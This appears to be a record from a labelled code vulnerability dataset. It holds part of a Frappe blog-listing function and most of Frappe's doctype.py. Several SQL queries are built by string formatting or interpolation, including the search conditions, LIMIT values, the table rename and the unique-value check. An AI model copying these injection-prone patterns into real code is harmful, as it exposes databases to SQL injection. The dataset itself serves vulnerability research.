		conditions.append('(t1.content like ""%{0}%"" or t1.title like ""%{0}%"")'.format(frappe.db.escape(txt)))

	if conditions:
		frappe.local.no_cache = 1

	query = """"""\
		select
			t1.title, t1.name, t1.blog_category, t1.route, t1.published_on,
				t1.published_on as creation,
				t1.content as content,
				ifnull(t1.blog_intro, t1.content) as intro,
				t2.full_name, t2.avatar, t1.blogger,
				(select count(name) from `tabCommunication`
					where
						communication_type='Comment'
						and comment_type='Comment'
						and reference_doctype='Blog Post'
						and reference_name=t1.name) as comments
		from `tabBlog Post` t1, `tabBlogger` t2
		where ifnull(t1.published,0)=1
		and t1.blogger = t2.name
		%(condition)s
		order by published_on desc, name asc
		limit %(start)s, %(page_len)s"""""" % {
			""start"": limit_start, ""page_len"": limit_page_length,
				""condition"": ("" and "" + "" and "".join(conditions)) if conditions else """"
		}

	posts = frappe.db.sql(query, as_dict=1)

	for post in posts:
		post.cover_image = find_first_image(post.content)
		post.published = global_date_format(post.creation)
		post.content = strip_html_tags(post.content[:340])
		if not post.comments:
			post.comment_text = _('No comments yet')
		elif post.comments==1:
			post.comment_text = _('1 comment')
		else:
			post.comment_text = _('{0} comments').format(str(post.comments))

		post.avatar = post.avatar or """"
		post.category = frappe.db.get_value('Blog Category', post.blog_category,
			['route', 'title'], as_dict=True)

		if post.avatar and (not ""http:"" in post.avatar and not ""https:"" in post.avatar) and not post.avatar.startswith(""/""):
			post.avatar = ""/"" + post.avatar

	return posts
/n/n/n",1
66,acd2f589b6cd2d1011be4a4e4965a1b3ed489c37,"frappe/core/doctype/doctype/doctype.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals

import six

import re, copy, os, subprocess
import frappe
from frappe import _

from frappe.utils import now, cint
from frappe.model import no_value_fields, default_fields
from frappe.model.document import Document
from frappe.custom.doctype.property_setter.property_setter import make_property_setter
from frappe.desk.notifications import delete_notification_count_for
from frappe.modules import make_boilerplate, get_doc_path
from frappe.model.db_schema import validate_column_name, validate_column_length, type_map
from frappe.model.docfield import supports_translation
import frappe.website.render

# imports - third-party imports
import pymysql
from pymysql.constants import ER

class InvalidFieldNameError(frappe.ValidationError): pass
class UniqueFieldnameError(frappe.ValidationError): pass
class IllegalMandatoryError(frappe.ValidationError): pass
class DoctypeLinkError(frappe.ValidationError): pass
class WrongOptionsDoctypeLinkError(frappe.ValidationError): pass
class HiddenAndMandatoryWithoutDefaultError(frappe.ValidationError): pass
class NonUniqueError(frappe.ValidationError): pass
class CannotIndexedError(frappe.ValidationError): pass
class CannotCreateStandardDoctypeError(frappe.ValidationError): pass

form_grid_templates = {
	""fields"": ""templates/form_grid/fields.html""
}

class DocType(Document):
	def get_feed(self):
		return self.name

	def validate(self):
		""""""Validate DocType before saving.

		- Check if developer mode is set.
		- Validate series
		- Check fieldnames (duplication etc)
		- Clear permission table for child tables
		- Add `amended_from` and `amended_by` if Amendable""""""

		self.check_developer_mode()

		self.validate_name()

		if self.issingle:
			self.allow_import = 0
			self.is_submittable = 0
			self.istable = 0

		elif self.istable:
			self.allow_import = 0
			self.permissions = []

		self.scrub_field_names()
		self.set_default_in_list_view()
		self.set_default_translatable()
		self.validate_series()
		self.validate_document_type()
		validate_fields(self)

		if self.istable:
			# no permission records for child table
			self.permissions = []
		else:
			validate_permissions(self)

		self.make_amendable()
		self.validate_website()

		if not self.is_new():
			self.before_update = frappe.get_doc('DocType', self.name)

		if not self.is_new():
			self.setup_fields_to_fetch()

		if self.default_print_format and not self.custom:
			frappe.throw(_('Standard DocType cannot have default print format, use Customize Form'))

	def set_default_in_list_view(self):
		'''Set default in-list-view for first 4 mandatory fields'''
		if not [d.fieldname for d in self.fields if d.in_list_view]:
			cnt = 0
			for d in self.fields:
				if d.reqd and not d.hidden and not d.fieldtype == ""Table"":
					d.in_list_view = 1
					cnt += 1
					if cnt == 4: break

	def set_default_translatable(self):
		'''Ensure that non-translatable never will be translatable'''
		for d in self.fields:
			if d.translatable and not supports_translation(d.fieldtype):
				d.translatable = 0

	def check_developer_mode(self):
		""""""Throw exception if not developer mode or via patch""""""
		if frappe.flags.in_patch or frappe.flags.in_test:
			return

		if not frappe.conf.get(""developer_mode"") and not self.custom:
			frappe.throw(_(""Not in Developer Mode! Set in site_config.json or make 'Custom' DocType.""), CannotCreateStandardDoctypeError)

	def setup_fields_to_fetch(self):
		'''Setup query to update values for newly set fetch values'''
		try:
			old_meta = frappe.get_meta(frappe.get_doc('DocType', self.name), cached=False)
			old_fields_to_fetch = [df.fieldname for df in old_meta.get_fields_to_fetch()]
		except frappe.DoesNotExistError:
			old_fields_to_fetch = []

		new_meta = frappe.get_meta(self, cached=False)

		self.flags.update_fields_to_fetch_queries = []

		if set(old_fields_to_fetch) != set([df.fieldname for df in new_meta.get_fields_to_fetch()]):
			for df in new_meta.get_fields_to_fetch():
				if df.fieldname not in old_fields_to_fetch:
					link_fieldname, source_fieldname = df.fetch_from.split('.', 1)
					link_df = new_meta.get_field(link_fieldname)

					self.flags.update_fields_to_fetch_queries.append('''update
							`tab{link_doctype}` source,
							`tab{doctype}` target
						set
							target.`{fieldname}` = source.`{source_fieldname}`
						where
							target.`{link_fieldname}` = source.name
							and ifnull(target.`{fieldname}`, '')="""" '''.format(
								link_doctype = link_df.options,
								source_fieldname = source_fieldname,
								doctype = self.name,
								fieldname = df.fieldname,
								link_fieldname = link_fieldname
					))

	def update_fields_to_fetch(self):
		'''Update fetch values based on queries setup'''
		if self.flags.update_fields_to_fetch_queries and not self.issingle:
			for query in self.flags.update_fields_to_fetch_queries:
				frappe.db.sql(query)

	def validate_document_type(self):
		if self.document_type==""Transaction"":
			self.document_type = ""Document""
		if self.document_type==""Master"":
			self.document_type = ""Setup""

	def validate_website(self):
		""""""Ensure that website generator has field 'route'""""""
		if self.has_web_view:
			# route field must be present
			if not 'route' in [d.fieldname for d in self.fields]:
				frappe.throw(_('Field ""route"" is mandatory for Web Views'), title='Missing Field')

			# clear website cache
			frappe.website.render.clear_cache()

	def change_modified_of_parent(self):
		""""""Change the timestamp of parent DocType if the current one is a child to clear caches.""""""
		if frappe.flags.in_import:
			return
		parent_list = frappe.db.sql(""""""SELECT parent
			from tabDocField where fieldtype=""Table"" and options=%s"""""", self.name)
		for p in parent_list:
			frappe.db.sql('UPDATE tabDocType SET modified=%s WHERE `name`=%s', (now(), p[0]))

	def scrub_field_names(self):
		""""""Sluggify fieldnames if not set from Label.""""""
		restricted = ('name','parent','creation','modified','modified_by',
			'parentfield','parenttype','file_list', 'flags', 'docstatus')
		for d in self.get(""fields""):
			if d.fieldtype:
				if (not getattr(d, ""fieldname"", None)):
					if d.label:
						d.fieldname = d.label.strip().lower().replace(' ','_')
						if d.fieldname in restricted:
							d.fieldname = d.fieldname + '1'
						if d.fieldtype=='Section Break':
							d.fieldname = d.fieldname + '_section'
						elif d.fieldtype=='Column Break':
							d.fieldname = d.fieldname + '_column'
					else:
						d.fieldname = d.fieldtype.lower().replace("" "",""_"") + ""_"" + str(d.idx)

				d.fieldname = re.sub('''['"",./%@()<>{}]''', '', d.fieldname)

				# fieldnames should be lowercase
				d.fieldname = d.fieldname.lower()

			# unique is automatically an index
			if d.unique: d.search_index = 0

	def validate_series(self, autoname=None, name=None):
		""""""Validate if `autoname` property is correctly set.""""""
		if not autoname: autoname = self.autoname
		if not name: name = self.name

		if not autoname and self.get(""fields"", {""fieldname"":""naming_series""}):
			self.autoname = ""naming_series:""

		# validate field name if autoname field:fieldname is used
		# Create unique index on autoname field automatically.
		if autoname and autoname.startswith('field:'):
			field = autoname.split("":"")[1]
			if not field or field not in [ df.fieldname for df in self.fields ]:
				frappe.throw(_(""Invalid fieldname '{0}' in autoname"".format(field)))
			else:
				for df in self.fields:
					if df.fieldname == field:
						df.unique = 1
						break

		if autoname and (not autoname.startswith('field:')) \
			and (not autoname.startswith('eval:')) \
			and (not autoname.lower() in ('prompt', 'hash')) \
			and (not autoname.startswith('naming_series:')):

			prefix = autoname.split('.')[0]
			used_in = frappe.db.sql('select name from tabDocType where substring_index(autoname, ""."", 1) = %s and name!=%s', (prefix, name))
			if used_in:
				frappe.throw(_(""Series {0} already used in {1}"").format(prefix, used_in[0][0]))

	def on_update(self):
		""""""Update database schema, make controller templates if `custom` is not set and clear cache.""""""
		from frappe.model.db_schema import updatedb
		self.delete_duplicate_custom_fields()
		try:
			updatedb(self.name, self)
		except Exception as e:
			print(""\n\nThere was an issue while migrating the DocType: {}\n"".format(self.name))
			raise e

		self.change_modified_of_parent()
		make_module_and_roles(self)

		self.update_fields_to_fetch()

		from frappe import conf
		if not self.custom and not (frappe.flags.in_import or frappe.flags.in_test) and conf.get('developer_mode'):
			self.export_doc()
			self.make_controller_template()

			if self.has_web_view:
				self.set_base_class_for_controller()

		# update index
		if not self.custom:
			self.run_module_method(""on_doctype_update"")
			if self.flags.in_insert:
				self.run_module_method(""after_doctype_insert"")

		delete_notification_count_for(doctype=self.name)
		frappe.clear_cache(doctype=self.name)

		if not frappe.flags.in_install and hasattr(self, 'before_update'):
			self.sync_global_search()

		# clear from local cache
		if self.name in frappe.local.meta_cache:
			del frappe.local.meta_cache[self.name]

		clear_linked_doctype_cache()

	def delete_duplicate_custom_fields(self):
		if not (frappe.db.table_exists(self.name) and frappe.db.table_exists(""Custom Field"")):
			return
		fields = [d.fieldname for d in self.fields if d.fieldtype in type_map]
		frappe.db.sql('''delete from
				`tabCustom Field`
			where
				 dt = {0} and fieldname in ({1})
		'''.format('%s', ', '.join(['%s'] * len(fields))), tuple([self.name] + fields), as_dict=True)

	def sync_global_search(self):
		'''If global search settings are changed, rebuild search properties for this table'''
		global_search_fields_before_update = [d.fieldname for d in
			self.before_update.fields if d.in_global_search]
		if self.before_update.show_name_in_global_search:
			global_search_fields_before_update.append('name')

		global_search_fields_after_update = [d.fieldname for d in
			self.fields if d.in_global_search]
		if self.show_name_in_global_search:
			global_search_fields_after_update.append('name')

		if set(global_search_fields_before_update) != set(global_search_fields_after_update):
			now = (not frappe.request) or frappe.flags.in_test or frappe.flags.in_install
			frappe.enqueue('frappe.utils.global_search.rebuild_for_doctype',
				now=now, doctype=self.name)

	def set_base_class_for_controller(self):
		'''Updates the controller class to subclass from `WebsiteGenertor`,
		if it is a subclass of `Document`'''
		controller_path = frappe.get_module_path(frappe.scrub(self.module),
			'doctype', frappe.scrub(self.name), frappe.scrub(self.name) + '.py')

		with open(controller_path, 'r') as f:
			code = f.read()

		class_string = '\nclass {0}(Document)'.format(self.name.replace(' ', ''))
		if '\nfrom frappe.model.document import Document' in code and class_string in code:
			code = code.replace('from frappe.model.document import Document',
				'from frappe.website.website_generator import WebsiteGenerator')
			code = code.replace('class {0}(Document)'.format(self.name.replace(' ', '')),
				'class {0}(WebsiteGenerator)'.format(self.name.replace(' ', '')))

		with open(controller_path, 'w') as f:
			f.write(code)


	def run_module_method(self, method):
		from frappe.modules import load_doctype_module
		module = load_doctype_module(self.name, self.module)
		if hasattr(module, method):
			getattr(module, method)()

	def before_rename(self, old, new, merge=False):
		""""""Throw exception if merge. DocTypes cannot be merged.""""""
		if not self.custom and frappe.session.user != ""Administrator"":
			frappe.throw(_(""DocType can only be renamed by Administrator""))

		self.check_developer_mode()
		self.validate_name(new)

		if merge:
			frappe.throw(_(""DocType can not be merged""))

		# Do not rename and move files and folders for custom doctype
		if not self.custom and not frappe.flags.in_test and not frappe.flags.in_patch:
			self.rename_files_and_folders(old, new)

	def after_rename(self, old, new, merge=False):
		""""""Change table name using `RENAME TABLE` if table exists. Or update
		`doctype` property for Single type.""""""
		if self.issingle:
			frappe.db.sql(""""""update tabSingles set doctype=%s where doctype=%s"""""", (new, old))
			frappe.db.sql(""""""update tabSingles set value=%s
				where doctype=%s and field='name' and value = %s"""""", (new, new, old))
		else:
			frappe.db.sql(""rename table `tab%s` to `tab%s`"" % (old, new))

	def rename_files_and_folders(self, old, new):
		# move files
		new_path = get_doc_path(self.module, 'doctype', new)
		subprocess.check_output(['mv', get_doc_path(self.module, 'doctype', old), new_path])

		# rename files
		for fname in os.listdir(new_path):
			if frappe.scrub(old) in fname:
				subprocess.check_output(['mv', os.path.join(new_path, fname),
					os.path.join(new_path, fname.replace(frappe.scrub(old), frappe.scrub(new)))])

		self.rename_inside_controller(new, old, new_path)
		frappe.msgprint('Renamed files and replaced code in controllers, please check!')

	def rename_inside_controller(self, new, old, new_path):
		for fname in ('{}.js', '{}.py', '{}_list.js', '{}_calendar.js', 'test_{}.py', 'test_{}.js'):
			fname = os.path.join(new_path, fname.format(frappe.scrub(new)))
			if os.path.exists(fname):
				with open(fname, 'r') as f:
					code = f.read()
				with open(fname, 'w') as f:
					f.write(code.replace(frappe.scrub(old).replace(' ', ''), frappe.scrub(new).replace(' ', '')))

	def before_reload(self):
		""""""Preserve naming series changes in Property Setter.""""""
		if not (self.issingle and self.istable):
			self.preserve_naming_series_options_in_property_setter()

	def preserve_naming_series_options_in_property_setter(self):
		""""""Preserve naming_series as property setter if it does not exist""""""
		naming_series = self.get(""fields"", {""fieldname"": ""naming_series""})

		if not naming_series:
			return

		# check if atleast 1 record exists
		if not (frappe.db.table_exists(self.name) and frappe.db.sql(""select name from `tab{}` limit 1"".format(self.name))):
			return

		existing_property_setter = frappe.db.get_value(""Property Setter"", {""doc_type"": self.name,
			""property"": ""options"", ""field_name"": ""naming_series""})

		if not existing_property_setter:
			make_property_setter(self.name, ""naming_series"", ""options"", naming_series[0].options, ""Text"", validate_fields_for_doctype=False)
			if naming_series[0].default:
				make_property_setter(self.name, ""naming_series"", ""default"", naming_series[0].default, ""Text"", validate_fields_for_doctype=False)

	def export_doc(self):
		""""""Export to standard folder `[module]/doctype/[name]/[name].json`.""""""
		from frappe.modules.export_file import export_to_files
		export_to_files(record_list=[['DocType', self.name]], create_init=True)

	def import_doc(self):
		""""""Import from standard folder `[module]/doctype/[name]/[name].json`.""""""
		from frappe.modules.import_module import import_from_files
		import_from_files(record_list=[[self.module, 'doctype', self.name]])

	def make_controller_template(self):
		""""""Make boilerplate controller template.""""""
		make_boilerplate(""controller._py"", self)

		if not self.istable:
			make_boilerplate(""test_controller._py"", self.as_dict())
			make_boilerplate(""controller.js"", self.as_dict())
			#make_boilerplate(""controller_list.js"", self.as_dict())
			if not os.path.exists(frappe.get_module_path(frappe.scrub(self.module),
				'doctype', frappe.scrub(self.name), 'tests')):
				make_boilerplate(""test_controller.js"", self.as_dict())

		if self.has_web_view:
			templates_path = frappe.get_module_path(frappe.scrub(self.module), 'doctype', frappe.scrub(self.name), 'templates')
			if not os.path.exists(templates_path):
				os.makedirs(templates_path)
			make_boilerplate('templates/controller.html', self.as_dict())
			make_boilerplate('templates/controller_row.html', self.as_dict())

	def make_amendable(self):
		""""""If is_submittable is set, add amended_from docfields.""""""
		if self.is_submittable:
			if not frappe.db.sql(""""""select name from tabDocField
				where fieldname = 'amended_from' and parent = %s"""""", self.name):
					self.append(""fields"", {
						""label"": ""Amended From"",
						""fieldtype"": ""Link"",
						""fieldname"": ""amended_from"",
						""options"": self.name,
						""read_only"": 1,
						""print_hide"": 1,
						""no_copy"": 1
					})

	def get_max_idx(self):
		""""""Returns the highest `idx`""""""
		max_idx = frappe.db.sql(""""""select max(idx) from `tabDocField` where parent = %s"""""",
			self.name)
		return max_idx and max_idx[0][0] or 0

	def validate_name(self, name=None):
		if not name:
			name = self.name

		# a DocType's name should not start with a number or underscore
		# and should only contain letters, numbers and underscore
		if six.PY2:
			is_a_valid_name = re.match(""^(?![\W])[^\d_\s][\w ]+$"", name)
		else:
			is_a_valid_name = re.match(""^(?![\W])[^\d_\s][\w ]+$"", name, flags = re.ASCII)
		if not is_a_valid_name:
			frappe.throw(_(""DocType's name should start with a letter and it can only consist of letters, numbers, spaces and underscores""), frappe.NameError)

def validate_fields_for_doctype(doctype):
	doc = frappe.get_doc(""DocType"", doctype)
	doc.delete_duplicate_custom_fields()
	validate_fields(frappe.get_meta(doctype, cached=False))

# this is separate because it is also called via custom field
def validate_fields(meta):
	""""""Validate doctype fields. Checks
	1. There are no illegal characters in fieldnames
	2. If fieldnames are unique.
	3. Validate column length.
	4. Fields that do have database columns are not mandatory.
	5. `Link` and `Table` options are valid.
	6. **Hidden** and **Mandatory** are not set simultaneously.
	7. `Check` type field has default as 0 or 1.
	8. `Dynamic Links` are correctly defined.
	9. Precision is set in numeric fields and is between 1 & 6.
	10. Fold is not at the end (if set).
	11. `search_fields` are valid.
	12. `title_field` and title field pattern are valid.
	13. `unique` check is only valid for Data, Link and Read Only fieldtypes.
	14. `unique` cannot be checked if there exist non-unique values.

	:param meta: `frappe.model.meta.Meta` object to check.""""""
	def check_illegal_characters(fieldname):
		validate_column_name(fieldname)

	def check_unique_fieldname(docname, fieldname):
		duplicates = list(filter(None, map(lambda df: df.fieldname==fieldname and str(df.idx) or None, fields)))
		if len(duplicates) > 1:
			frappe.throw(_(""{0}: Fieldname {1} appears multiple times in rows {2}"").format(docname, fieldname, "", "".join(duplicates)), UniqueFieldnameError)

	def check_fieldname_length(fieldname):
		validate_column_length(fieldname)

	def check_illegal_mandatory(docname, d):
		if (d.fieldtype in no_value_fields) and d.fieldtype!=""Table"" and d.reqd:
			frappe.throw(_(""{0}: Field {1} of type {2} cannot be mandatory"").format(docname, d.label, d.fieldtype), IllegalMandatoryError)

	def check_link_table_options(docname, d):
		if d.fieldtype in (""Link"", ""Table""):
			if not d.options:
				frappe.throw(_(""{0}: Options required for Link or Table type field {1} in row {2}"").format(docname, d.label, d.idx), DoctypeLinkError)
			if d.options==""[Select]"" or d.options==d.parent:
				return
			if d.options != d.parent:
				options = frappe.db.get_value(""DocType"", d.options, ""name"")
				if not options:
					frappe.throw(_(""{0}: Options must be a valid DocType for field {1} in row {2}"").format(docname, d.label, d.idx), WrongOptionsDoctypeLinkError)
				elif not (options == d.options):
					frappe.throw(_(""{0}: Options {1} must be the same as doctype name {2} for the field {3}"", DoctypeLinkError)
						.format(docname, d.options, options, d.label))
				else:
					# fix case
					d.options = options

	def check_hidden_and_mandatory(docname, d):
		if d.hidden and d.reqd and not d.default:
			frappe.throw(_(""{0}: Field {1} in row {2} cannot be hidden and mandatory without default"").format(docname, d.label, d.idx), HiddenAndMandatoryWithoutDefaultError)

	def check_width(d):
		if d.fieldtype == ""Currency"" and cint(d.width) < 100:
			frappe.throw(_(""Max width for type Currency is 100px in row {0}"").format(d.idx))

	def check_in_list_view(d):
		if d.in_list_view and (d.fieldtype in not_allowed_in_list_view):
			frappe.throw(_(""'In List View' not allowed for type {0} in row {1}"").format(d.fieldtype, d.idx))

	def check_in_global_search(d):
		if d.in_global_search and d.fieldtype in no_value_fields:
			frappe.throw(_(""'In Global Search' not allowed for type {0} in row {1}"")
				.format(d.fieldtype, d.idx))

	def check_dynamic_link_options(d):
		if d.fieldtype==""Dynamic Link"":
			doctype_pointer = list(filter(lambda df: df.fieldname==d.options, fields))
			if not doctype_pointer or (doctype_pointer[0].fieldtype not in (""Link"", ""Select"")) \
				or (doctype_pointer[0].fieldtype==""Link"" and doctype_pointer[0].options!=""DocType""):
				frappe.throw(_(""Options 'Dynamic Link' type of field must point to another Link Field with options as 'DocType'""))

	def check_illegal_default(d):
		if d.fieldtype == ""Check"" and d.default and d.default not in ('0', '1'):
			frappe.throw(_(""Default for 'Check' type of field must be either '0' or '1'""))
		if d.fieldtype == ""Select"" and d.default and (d.default not in d.options.split(""\n"")):
			frappe.throw(_(""Default for {0} must be an option"").format(d.fieldname))

	def check_precision(d):
		if d.fieldtype in (""Currency"", ""Float"", ""Percent"") and d.precision is not None and not (1 <= cint(d.precision) <= 6):
			frappe.throw(_(""Precision should be between 1 and 6""))

	def check_unique_and_text(docname, d):
		if meta.issingle:
			d.unique = 0
			d.search_index = 0

		if getattr(d, ""unique"", False):
			if d.fieldtype not in (""Data"", ""Link"", ""Read Only""):
				frappe.throw(_(""{0}: Fieldtype {1} for {2} cannot be unique"").format(docname, d.fieldtype, d.label), NonUniqueError)

			if not d.get(""__islocal""):
				try:
					has_non_unique_values = frappe.db.sql(""""""select `{fieldname}`, count(*)
						from `tab{doctype}` where ifnull({fieldname}, '') != ''
						group by `{fieldname}` having count(*) > 1 limit 1"""""".format(
						doctype=d.parent, fieldname=d.fieldname))

				except pymysql.InternalError as e:
					if e.args and e.args[0] == ER.BAD_FIELD_ERROR:
						# ignore if missing column, else raise
						# this happens in case of Custom Field
						pass
					else:
						raise

				else:
					# else of try block
					if has_non_unique_values and has_non_unique_values[0][0]:
						frappe.throw(_(""{0}: Field '{1}' cannot be set as Unique as it has non-unique values"").format(docname, d.label), NonUniqueError)

		if d.search_index and d.fieldtype in (""Text"", ""Long Text"", ""Small Text"", ""Code"", ""Text Editor""):
			frappe.throw(_(""{0}:Fieldtype {1} for {2} cannot be indexed"").format(docname, d.fieldtype, d.label), CannotIndexedError)

	def check_fold(fields):
		fold_exists = False
		for i, f in enumerate(fields):
			if f.fieldtype==""Fold"":
				if fold_exists:
					frappe.throw(_(""There can be only one Fold in a form""))
				fold_exists = True
				if i < len(fields)-1:
					nxt = fields[i+1]
					if nxt.fieldtype != ""Section Break"":
						frappe.throw(_(""Fold must come before a Section Break""))
				else:
					frappe.throw(_(""Fold can not be at the end of the form""))

	def check_search_fields(meta, fields):
		""""""Throw exception if `search_fields` don't contain valid fields.""""""
		if not meta.search_fields:
			return

		# No value fields should not be included in search field
		search_fields = [field.strip() for field in (meta.search_fields or """").split("","")]
		fieldtype_mapper = { field.fieldname: field.fieldtype \
			for field in filter(lambda field: field.fieldname in search_fields, fields) }

		for fieldname in search_fields:
			fieldname = fieldname.strip()
			if (fieldtype_mapper.get(fieldname) in no_value_fields) or \
				(fieldname not in fieldname_list):
				frappe.throw(_(""Search field {0} is not valid"").format(fieldname))

	def check_title_field(meta):
		""""""Throw exception if `title_field` isn't a valid fieldname.""""""
		if not meta.get(""title_field""):
			return

		if meta.title_field not in fieldname_list:
			frappe.throw(_(""Title field must be a valid fieldname""), InvalidFieldNameError)

		def _validate_title_field_pattern(pattern):
			if not pattern:
				return

			for fieldname in re.findall(""{(.*?)}"", pattern, re.UNICODE):
				if fieldname.startswith(""{""):
					# edge case when double curlies are used for escape
					continue

				if fieldname not in fieldname_list:
					frappe.throw(_(""{{{0}}} is not a valid fieldname pattern. It should be {{field_name}}."").format(fieldname),
						InvalidFieldNameError)

		df = meta.get(""fields"", filters={""fieldname"": meta.title_field})[0]
		if df:
			_validate_title_field_pattern(df.options)
			_validate_title_field_pattern(df.default)

	def check_image_field(meta):
		'''check image_field exists and is of type ""Attach Image""'''
		if not meta.image_field:
			return

		df = meta.get(""fields"", {""fieldname"": meta.image_field})
		if not df:
			frappe.throw(_(""Image field must be a valid fieldname""), InvalidFieldNameError)
		if df[0].fieldtype != 'Attach Image':
			frappe.throw(_(""Image field must be of type Attach Image""), InvalidFieldNameError)

	def check_is_published_field(meta):
		if not meta.is_published_field:
			return

		if meta.is_published_field not in fieldname_list:
			frappe.throw(_(""Is Published Field must be a valid fieldname""), InvalidFieldNameError)

	def check_timeline_field(meta):
		if not meta.timeline_field:
			return

		if meta.timeline_field not in fieldname_list:
			frappe.throw(_(""Timeline field must be a valid fieldname""), InvalidFieldNameError)

		df = meta.get(""fields"", {""fieldname"": meta.timeline_field})[0]
		if df.fieldtype not in (""Link"", ""Dynamic Link""):
			frappe.throw(_(""Timeline field must be a Link or Dynamic Link""), InvalidFieldNameError)

	def check_sort_field(meta):
		'''Validate that sort_field(s) is a valid field'''
		if meta.sort_field:
			sort_fields = [meta.sort_field]
			if ','  in meta.sort_field:
				sort_fields = [d.split()[0] for d in meta.sort_field.split(',')]

			for fieldname in sort_fields:
				if not fieldname in fieldname_list + list(default_fields):
					frappe.throw(_(""Sort field {0} must be a valid fieldname"").format(fieldname),
						InvalidFieldNameError)

	def check_illegal_depends_on_conditions(docfield):
		''' assignment operation should not be allowed in the depends on condition.'''
		depends_on_fields = [""depends_on"", ""collapsible_depends_on""]
		for field in depends_on_fields:
			depends_on = docfield.get(field, None)
			if depends_on and (""="" in depends_on) and \
				re.match(""""""[\w\.:_]+\s*={1}\s*[\w\.@'""]+"""""", depends_on):
				frappe.throw(_(""Invalid {0} condition"").format(frappe.unscrub(field)), frappe.ValidationError)

	def scrub_options_in_select(field):
		""""""Strip options for whitespaces""""""

		if field.fieldtype == ""Select"" and field.options is not None:
			options_list = []
			for i, option in enumerate(field.options.split(""\n"")):
				_option = option.strip()
				if i==0 or _option:
					options_list.append(_option)
			field.options = '\n'.join(options_list)

	def scrub_fetch_from(field):
		if hasattr(field, 'fetch_from') and getattr(field, 'fetch_from'):
			field.fetch_from = field.fetch_from.strip('\n').strip()

	fields = meta.get(""fields"")
	fieldname_list = [d.fieldname for d in fields]

	not_allowed_in_list_view = list(copy.copy(no_value_fields))
	not_allowed_in_list_view.append(""Attach Image"")
	if meta.istable:
		not_allowed_in_list_view.remove('Button')

	for d in fields:
		if not d.permlevel: d.permlevel = 0
		if d.fieldtype != ""Table"": d.allow_bulk_edit = 0
		if not d.fieldname:
			d.fieldname = d.fieldname.lower()

		check_illegal_characters(d.fieldname)
		check_unique_fieldname(meta.get(""name""), d.fieldname)
		check_fieldname_length(d.fieldname)
		check_illegal_mandatory(meta.get(""name""), d)
		check_link_table_options(meta.get(""name""), d)
		check_dynamic_link_options(d)
		check_hidden_and_mandatory(meta.get(""name""), d)
		check_in_list_view(d)
		check_in_global_search(d)
		check_illegal_default(d)
		check_unique_and_text(meta.get(""name""), d)
		check_illegal_depends_on_conditions(d)
		scrub_options_in_select(d)
		scrub_fetch_from(d)

	check_fold(fields)
	check_search_fields(meta, fields)
	check_title_field(meta)
	check_timeline_field(meta)
	check_is_published_field(meta)
	check_sort_field(meta)
	check_image_field(meta)

def validate_permissions_for_doctype(doctype, for_remove=False):
	""""""Validates if permissions are set correctly.""""""
	doctype = frappe.get_doc(""DocType"", doctype)
	validate_permissions(doctype, for_remove)

	# save permissions
	for perm in doctype.get(""permissions""):
		perm.db_update()

	clear_permissions_cache(doctype.name)

def clear_permissions_cache(doctype):
	frappe.clear_cache(doctype=doctype)
	delete_notification_count_for(doctype)
	for user in frappe.db.sql_list(""""""select
			distinct `tabHas Role`.parent
		from
			`tabHas Role`,
		tabDocPerm
			where tabDocPerm.parent = %s
			and tabDocPerm.role = `tabHas Role`.role"""""", doctype):
		frappe.clear_cache(user=user)

def validate_permissions(doctype, for_remove=False):
	permissions = doctype.get(""permissions"")
	if not permissions:
		frappe.msgprint(_('No Permissions Specified'), alert=True, indicator='orange')
	issingle = issubmittable = isimportable = False
	if doctype:
		issingle = cint(doctype.issingle)
		issubmittable = cint(doctype.is_submittable)
		isimportable = cint(doctype.allow_import)

	def get_txt(d):
		return _(""For {0} at level {1} in {2} in row {3}"").format(d.role, d.permlevel, d.parent, d.idx)

	def check_atleast_one_set(d):
		if not d.read and not d.write and not d.submit and not d.cancel and not d.create:
			frappe.throw(_(""{0}: No basic permissions set"").format(get_txt(d)))

	def check_double(d):
		has_similar = False
		similar_because_of = """"
		for p in permissions:
			if p.role==d.role and p.permlevel==d.permlevel and p!=d:
				if p.if_owner==d.if_owner:
					similar_because_of = _(""If Owner"")
					has_similar = True
					break

		if has_similar:
			frappe.throw(_(""{0}: Only one rule allowed with the same Role, Level and {1}"")\
				.format(get_txt(d),	similar_because_of))

	def check_level_zero_is_set(d):
		if cint(d.permlevel) > 0 and d.role != 'All':
			has_zero_perm = False
			for p in permissions:
				if p.role==d.role and (p.permlevel or 0)==0 and p!=d:
					has_zero_perm = True
					break

			if not has_zero_perm:
				frappe.throw(_(""{0}: Permission at level 0 must be set before higher levels are set"").format(get_txt(d)))

			for invalid in (""create"", ""submit"", ""cancel"", ""amend""):
				if d.get(invalid): d.set(invalid, 0)

	def check_permission_dependency(d):
		if d.cancel and not d.submit:
			frappe.throw(_(""{0}: Cannot set Cancel without Submit"").format(get_txt(d)))

		if (d.submit or d.cancel or d.amend) and not d.write:
			frappe.throw(_(""{0}: Cannot set Submit, Cancel, Amend without Write"").format(get_txt(d)))
		if d.amend and not d.write:
			frappe.throw(_(""{0}: Cannot set Amend without Cancel"").format(get_txt(d)))
		if d.get(""import"") and not d.create:
			frappe.throw(_(""{0}: Cannot set Import without Create"").format(get_txt(d)))

	def remove_rights_for_single(d):
		if not issingle:
			return

		if d.report:
			frappe.msgprint(_(""Report cannot be set for Single types""))
			d.report = 0
			d.set(""import"", 0)
			d.set(""export"", 0)

		for ptype, label in [[""set_user_permissions"", _(""Set User Permissions"")]]:
			if d.get(ptype):
				d.set(ptype, 0)
				frappe.msgprint(_(""{0} cannot be set for Single types"").format(label))

	def check_if_submittable(d):
		if d.submit and not issubmittable:
			frappe.throw(_(""{0}: Cannot set Assign Submit if not Submittable"").format(get_txt(d)))
		elif d.amend and not issubmittable:
			frappe.throw(_(""{0}: Cannot set Assign Amend if not Submittable"").format(get_txt(d)))

	def check_if_importable(d):
		if d.get(""import"") and not isimportable:
			frappe.throw(_(""{0}: Cannot set import as {1} is not importable"").format(get_txt(d), doctype))

	for d in permissions:
		if not d.permlevel:
			d.permlevel=0
		check_atleast_one_set(d)
		if not for_remove:
			check_double(d)
			check_permission_dependency(d)
			check_if_submittable(d)
			check_if_importable(d)
		check_level_zero_is_set(d)
		remove_rights_for_single(d)

def make_module_and_roles(doc, perm_fieldname=""permissions""):
	""""""Make `Module Def` and `Role` records if already not made. Called while installing.""""""
	try:
		if hasattr(doc,'restrict_to_domain') and doc.restrict_to_domain and \
			not frappe.db.exists('Domain', doc.restrict_to_domain):
			frappe.get_doc(dict(doctype='Domain', domain=doc.restrict_to_domain)).insert()

